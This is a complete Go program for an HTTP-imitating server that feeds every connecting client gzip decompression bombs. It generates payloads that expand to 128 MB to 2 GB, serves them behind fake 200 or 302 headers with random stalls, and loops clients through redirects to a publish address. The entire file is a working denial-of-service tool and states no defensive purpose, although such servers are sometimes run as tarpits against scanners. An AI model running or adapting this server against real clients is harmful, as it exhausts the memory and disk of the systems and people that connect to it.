package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"sync"

	"compress/gzip"
	"math/rand"
	"time"
)

var pAddr string
var sizes = []int{128, 256, 512, 1024, 2048}
var hdr200 = []byte("HTTP/1.1 200 OK\nContent-Encoding: gzip\n\n")

func makePayload(mb int) []byte {
	log.Printf("making payload size %dMB\n", mb)
	var w bytes.Buffer
	gz, err := gzip.NewWriterLevel(&w, gzip.BestCompression)
	if err != nil {
		panic(err)
	}
	defer gz.Close()
	// Fill up a page's worth + plus overflow.
	trashWord, trashBuf := []byte("corn0"), []byte{}
	for len(trashBuf) < 4096 {
		trashBuf = append(trashBuf, trashWord...)
	}
	for i := 0; i < (mb*1024*1024)/4096; i++ {
		gz.Write(trashBuf)
	}
	if err := gz.Flush(); err != nil {
		panic(err)
	}
	log.Printf("payload size %dMB: %d bytes\n", mb, len(w.Bytes()))
	return w.Bytes()
}

func makePayloads() {
	var wg sync.WaitGroup
	wg.Add(len(sizes))
	for _, v := range sizes {
		go func(vv int) {
			defer wg.Done()
			fn := fmt.Sprintf("%dMB.gz", vv)
			if f, err := os.Open(fn); err == nil {
				f.Close()
				return
			}
			data := makePayload(vv)
			f, err := os.Create(fn)
			if err != nil {
				panic(err)
			}
			defer f.Close()
			if _, err = f.Write(data); err != nil {
				panic(err)
			}
		}(v)
	}
	wg.Wait()
	log.Println("done generating payloads")
}

func sendFile(conn net.Conn) error {
	fn := fmt.Sprintf("%dMB.gz", sizes[rand.Intn(len(sizes))])
	f, err := os.Open(fn)
	if err != nil {
		return err
	}
	log.Println("sending payload", fn)
	defer f.Close()
	_, err = (conn.(*net.TCPConn)).ReadFrom(f)
	return err
}

func bomb(conn net.Conn) {
	defer conn.Close()
	log.Printf("serving %v", (conn.(*net.TCPConn)).RemoteAddr())

	// Show what the client sent over.
	go io.Copy(os.Stdout, conn)

	// Stall some to pretend the client request is being processed.
	time.Sleep(time.Duration((rand.Float64() + 0.01) * float64(time.Second)))

	// Randomly choose to redirect.
	var hdr []byte
	if rand.Intn(5) == 0 {
		hdr = hdr200
	} else {
		tstr := fmt.Sprintf("%v", time.Now().UnixNano())
		hdr302 := []byte("HTTP/1.1 302 Found\nLocation: http://" +
			pAddr + "/" + tstr + "\nContent-Type: text/html\r\nContent-Encoding: gzip\n\n")
		hdr = hdr302
	}
	if _, err := conn.Write(hdr); err != nil {
		panic(err)
	}
	if err := sendFile(conn); err != nil {
		panic(err)
	}

	// Randomly sleep.
	log.Printf("served %v", (conn.(*net.TCPConn)).RemoteAddr())
	if rand.Intn(5) == 0 {
		log.Printf("sleeping %v", (conn.(*net.TCPConn)).RemoteAddr())
		time.Sleep(20 * time.Second)
	}
}

func main() {
	makePayloads()

	laddrFlag := flag.String("l", ":8080", "listen address")
	paddrFlag := flag.String("P", "corn.cash:8080", "publish address")
	flag.Parse()

	ln, err := net.Listen("tcp", *laddrFlag)
	if err != nil {
		panic(err)
	}
	pAddr = *paddrFlag
	log.Println("listening on", *laddrFlag, "with publish address", pAddr)
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println(err)
			continue
		}
		go bomb(conn)
	}
}
